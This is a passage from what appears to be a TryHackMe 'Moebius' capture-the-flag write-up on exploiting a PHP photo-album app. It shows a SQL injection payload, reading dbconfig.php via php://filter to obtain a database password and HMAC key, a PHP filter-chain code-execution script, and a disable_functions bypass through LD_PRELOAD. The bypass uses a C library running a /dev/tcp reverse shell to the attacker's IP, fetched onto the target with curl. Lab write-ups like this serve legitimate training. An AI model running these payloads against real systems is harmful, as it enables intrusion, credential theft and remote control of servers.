    <span class="c1">// Create a new PDO instance</span>
    <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="s2">"mysql:host=</span><span class="nv">$servername</span><span class="s2">;dbname=</span><span class="nv">$dbname</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>

    <span class="c1">// Set PDO error mode to exception</span>
    <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">setAttribute</span><span class="p">(</span><span class="no">PDO</span><span class="o">::</span><span class="no">ATTR_ERRMODE</span><span class="p">,</span> <span class="no">PDO</span><span class="o">::</span><span class="no">ERRMODE_EXCEPTION</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[\/;]/'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'short_tag'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="c1">// If it does, terminate with an error message</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"Hacking attempt"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nv">$album_id</span> <span class="o">=</span> <span class="s2">"SELECT id from albums where short_tag = '"</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'short_tag'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"'"</span><span class="p">;</span>
    <span class="nv">$result_album</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$album_id</span><span class="p">);</span>
    <span class="nv">$result_album</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>

    <span class="nv">$r</span><span class="o">=</span><span class="nv">$result_album</span><span class="o">-&gt;</span><span class="nf">fetch</span><span class="p">();</span>
    <span class="nv">$id</span><span class="o">=</span><span class="nv">$r</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>


    <span class="c1">// Fetch image IDs from the database</span>
    <span class="nv">$sql_ids</span> <span class="o">=</span> <span class="s2">"SELECT * FROM images where album_id="</span> <span class="mf">.</span> <span class="nv">$id</span><span class="p">;</span>
    <span class="nv">$stmt_path</span><span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$sql_ids</span><span class="p">);</span>
    <span class="nv">$stmt_path</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>

    <span class="c1">// Display the album id</span>
    <span class="k">echo</span> <span class="s2">"&lt;!-- Short tag: "</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'short_tag'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" - Album ID: "</span> <span class="mf">.</span> <span class="nv">$id</span> <span class="mf">.</span> <span class="s2">"--&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="c1">// Display images in a grid</span>
    <span class="k">echo</span> <span class="s1">'&lt;div class="grid-container"&gt;'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stmt_path</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Get the image ID</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">"path"</span><span class="p">];</span>
        <span class="nv">$hash</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$SECRET_KEY</span><span class="p">);</span>

        <span class="c1">// Create link to image.php with image ID</span>
        <span class="k">echo</span> <span class="s1">'&lt;div class="image-container"&gt;'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;a href="/image.php?hash='</span><span class="mf">.</span> <span class="nv">$hash</span> <span class="mf">.</span> <span class="s1">'&amp;path='</span> <span class="mf">.</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s1">'"&gt;'</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'&lt;img src="/image.php?hash='</span><span class="mf">.</span> <span class="nv">$hash</span> <span class="mf">.</span> <span class="s1">'&amp;path='</span> <span class="mf">.</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s1">'" alt="Image path: '</span> <span class="mf">.</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s1">'"&gt;'</span><span class="p">;</span>
<span class="mf">...</span>
</pre></table></code></div></div><p>Reading the source code of <code class="language-plaintext highlighter-rouge">album.php</code>, we see that the application calculates hashes using HMAC-SHA256:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$hash</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$SECRET_KEY</span><span class="p">);</span>
</pre></table></code></div></div><p>However, the <code class="language-plaintext highlighter-rouge">SECRET_KEY</code> is not defined inside <code class="language-plaintext highlighter-rouge">album.php</code> — instead, it includes <code class="language-plaintext highlighter-rouge">dbconfig.php</code>, so it is most likely that the key is defined there.</p><p>To retrieve <code class="language-plaintext highlighter-rouge">dbconfig.php</code>, we repeat the same method: hex-encode the path and create another payload:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>jxf' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -
</pre></table></code></div></div><p>This allows us to fetch the hash for <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=dbconfig.php</code>.</p><p><a href="/images/tryhackme_moebius/web_80_album_sqli10.webp" class="popup img-link shimmer"><img src="/images/tryhackme_moebius/web_80_album_sqli10.webp" alt="Web 80 Album Sqli Ten" width="1200" height="450" loading="lazy"></a></p><p>Reading the content of <code class="language-plaintext highlighter-rouge">dbconfig.php</code> gives:</p><div class="language-bash wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://10.10.152.169/image.php?hash=329e7517a6e3c82421ee8ce483271c69a71fbcc7e6956abde4957a63f4ad9ccf&amp;path=php://filter/convert.base64-encode/resource=dbconfig.php'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
</pre></table></code></div></div><p>Output:</p><div class="language-php wrap highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">// Database connection settings</span>
<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"db"</span><span class="p">;</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"web"</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"TAJnF6YuIot83X3g"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"web"</span><span class="p">;</span>


<span class="nv">$SECRET_KEY</span><span class="o">=</span><span class="s1">'an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Now that we have the <code class="language-plaintext highlighter-rouge">SECRET_KEY</code>, we can easily calculate valid HMAC-SHA256 hashes for any path we want. Here’s a simple Python script to automate this:</p><div file="hash_calc.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="hash_calc.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">hmac</span>
<span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="n">secret_key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW</span><span class="sh">"</span>
<span class="n">path</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">encode</span><span class="p">()</span>
<span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">)</span>
<span class="n">signature</span> <span class="o">=</span> <span class="n">h</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>
</pre></table></code></div></div><p>Using this script, we can easily calculate the hash for any target file. For example, to read the <code class="language-plaintext highlighter-rouge">image.php</code> source:</p><div class="language-bash wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 hash_calc.py <span class="s1">'php://filter/convert.base64-encode/resource=image.php'</span>
ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6

<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://10.10.152.169/image.php?hash=ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6&amp;path=php://filter/convert.base64-encode/resource=image.php'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
</pre></table></code></div></div><p>And the <code class="language-plaintext highlighter-rouge">image.php</code> source code confirms that once the hash is valid, the file at the given <code class="language-plaintext highlighter-rouge">path</code> is simply included:</p><div class="language-php wrap highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="k">include</span><span class="p">(</span><span class="s1">'dbconfig.php'</span><span class="p">);</span>
<span class="mf">...</span>
    <span class="nv">$image_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
    <span class="nv">$hash</span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hash'</span><span class="p">];</span>

    <span class="nv">$computed_hash</span><span class="o">=</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$image_path</span><span class="p">,</span> <span class="nv">$SECRET_KEY</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$image_path</span> <span class="o">&amp;&amp;</span> <span class="nv">$computed_hash</span> <span class="o">===</span> <span class="nv">$hash</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Get the MIME type of the image</span>
        <span class="nv">$image_info</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$image_path</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$image_info</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$image_info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nv">$image_info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">];</span>
            <span class="c1">// Set the appropriate content type header</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-type: </span><span class="nv">$mime_type</span><span class="s2">"</span><span class="p">);</span>

            <span class="c1">// Output the image data</span>
            <span class="k">include</span><span class="p">(</span><span class="nv">$image_path</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-type: application/octet-stream"</span><span class="p">);</span>
            <span class="k">include</span><span class="p">(</span><span class="nv">$image_path</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"Image not found"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><h3 id="php-filters-chain-exploitation"><span class="me-2">PHP Filters Chain Exploitation</span><a href="#php-filters-chain-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To turn this <strong>LFI</strong> vulnerability into <strong>RCE</strong>, another method besides log poisoning is to use <strong>PHP filters chain</strong>. This technique allows us to combine multiple filters to ultimately create a “file” containing whatever content we want and include it — in this case, <strong>PHP code</strong>.</p><p>We can generate a filter chain using <a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a> by <strong>Synacktiv</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 ./php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?=eval($_GET[0])?&gt;'</span>
<span class="gp">[+] The following gadget chain will generate the following code : &lt;?=eval($</span>_GET[0]<span class="o">)</span>?&gt; <span class="o">(</span><span class="nb">base64 </span>value: PD89ZXZhbCgkX0dFVFswXSk/Pg<span class="o">)</span>
<span class="go">php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
</span></pre></table></code></div></div><p>To make exploitation easier, we can write a simple script to execute arbitrary PHP code on the target:</p><div file="execute_code.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="execute_code.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">hmac</span>
<span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">target_url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://10.10.152.169/image.php</span><span class="sh">"</span> <span class="c1"># change the IP address
</span>
<span class="n">secret_key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW</span><span class="sh">"</span>
<span class="n">path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="c1"># replace with the output of php_filter_chain_generator.py 
</span><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">)</span>
<span class="n">signature</span> <span class="o">=</span> <span class="n">h</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">()</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">signature</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">path</span><span class="sh">"</span><span class="p">:</span> <span class="n">path</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">:</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">code&gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p>However, when trying to execute the <code class="language-plaintext highlighter-rouge">system()</code> function to achieve RCE, we encounter the following error:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 execute_code.py
<span class="gp">code&gt;</span><span class="w"> </span>system<span class="o">(</span><span class="s2">"id"</span><span class="o">)</span><span class="p">;</span>
<span class="gp">&lt;br /&gt;</span><span class="w">
</span><span class="gp">&lt;b&gt;</span>Fatal error&lt;/b&gt;:  Uncaught Error: Call to undefined <span class="k">function </span>system<span class="o">()</span> <span class="k">in</span> ...
</pre></table></code></div></div><p>Checking the disabled PHP functions confirms why — <code class="language-plaintext highlighter-rouge">system</code> (along with many others) is disabled:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">code&gt;</span><span class="w"> </span><span class="nb">echo </span>ini_get<span class="o">(</span><span class="s1">'disable_functions'</span><span class="o">)</span><span class="p">;</span>
<span class="go">exec, system, popen, proc_open, proc_nice, shell_exec, passthru, dl, pcntl_alarm, pcntl_async_signals, pcntl_errno, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_rfork, pcntl_setpriority, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_signal, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig...
</span></pre></table></code></div></div><h3 id="disabled-functions-bypass"><span class="me-2">Disabled Functions Bypass</span><a href="#disabled-functions-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>It seems that any major function that could help us execute commands on the target has been disabled. However, if we look for ways to bypass disabled functions, we may come across an <a href="https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#ld_preload-bypass">interesting method</a> utilizing the <code class="language-plaintext highlighter-rouge">putenv</code> and <code class="language-plaintext highlighter-rouge">mail</code> functions.</p><p>Basically, the method uses the <code class="language-plaintext highlighter-rouge">putenv</code> function to set the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> environment variable. Any shared library specified in this environment variable gets loaded when a program is run. After that, by calling the <code class="language-plaintext highlighter-rouge">mail</code> function, it causes the <code class="language-plaintext highlighter-rouge">sendmail</code> program to run, and the library specified in <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> gets loaded and executed. We can try to use this method to bypass the disabled functions.</p><p>First, we create a shared library (<code class="language-plaintext highlighter-rouge">shell.c</code>) that executes a reverse shell command:</p><div file="shell.c" class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="shell.c"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"bash -c </span><span class="se">\"</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.14.101.76/443 0&gt;&amp;1</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Compiling it:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> shell.so shell.c <span class="nt">-nostartfiles</span>
</pre></table></code></div></div><p>Serving it via a simple HTTP server:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</pre></table></code></div></div><p>Now, using the PHP code execution to download the library onto the target:</p><div class="language-console wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 execute_code.py
<span class="gp">code&gt;</span><span class="w"> </span><span class="nv">$ch</span> <span class="o">=</span> curl_init<span class="o">(</span><span class="s1">'http://10.14.101.76/shell.so'</span><span class="o">)</span><span class="p">;</span>curl_setopt<span class="o">(</span><span class="nv">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>file_put_contents<span class="o">(</span><span class="s1">'/tmp/shell.so'</span>, curl_exec<span class="o">(</span><span class="nv">$ch</span><span class="o">))</span><span class="p">;</span> curl_close<span class="o">(</span><span class="nv">$ch</span><span class="o">)</span><span class="p">;</span>
</pre></table></code></div></div><p>We can see the library being downloaded from our server:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.152.169 - - [27/Apr/2025 13:47:10] "GET /shell.so HTTP/1.1" 200 -
</span></pre></table></code></div></div><p>Now, setting the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> environment variable with the <code class="language-plaintext highlighter-rouge">putenv</code> function to the library we uploaded, and calling the <code class="language-plaintext highlighter-rouge">mail</code> function to run the <code class="language-plaintext highlighter-rouge">sendmail</code> program, causing our library to be loaded and executed:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">code&gt;</span><span class="w"> </span>putenv<span class="o">(</span><span class="s1">'LD_PRELOAD=/tmp/shell.so'</span><span class="o">)</span><span class="p">;</span> mail<span class="o">(</span><span class="s1">'a'</span>,<span class="s1">'a'</span>,<span class="s1">'a'</span>,<span class="s1">'a'</span><span class="o">)</span><span class="p">;</span>
</pre></table></code></div></div><p>With this, we can see that our reverse shell payload is executed, and we get a shell as the <code class="language-plaintext highlighter-rouge">www-data</code> user inside a container:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 443
<span class="go">listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.152.169] 46126
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">www-data@bb28d5969dd5:/var/www/html$</span><span class="w"> </span>script <span class="nt">-qc</span> /bin/bash /dev/null
<span class="gp">www-data@bb28d5969dd5:/var/www/html$</span><span class="w"> </span>^Z
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="go">
</span><span class="gp">www-data@bb28d5969dd5:/var/www/html$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="gp">www-data@bb28d5969dd5:/var/www/html$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
</span></pre></table></code></div></div><blockquote class="prompt-tip"><p>You can also use <a href="https://github.com/TarlogicSecurity/Chankro">Chankro</a> for this part by uploading the PHP file it generated to the server and simply including that.</p></blockquote><h2 id="user-flag"><span class="me-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="container-escape"><span class="me-2">Container Escape</span><a href="#container-escape" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Checking the <code class="language-plaintext highlighter-rouge">sudo</code> privileges for the <code class="language-plaintext highlighter-rouge">www-data</code> user inside the container reveals full access:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">www-data@bb28d5969dd5:/var/www/html$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for www-data on bb28d5969dd5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on bb28d5969dd5:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL
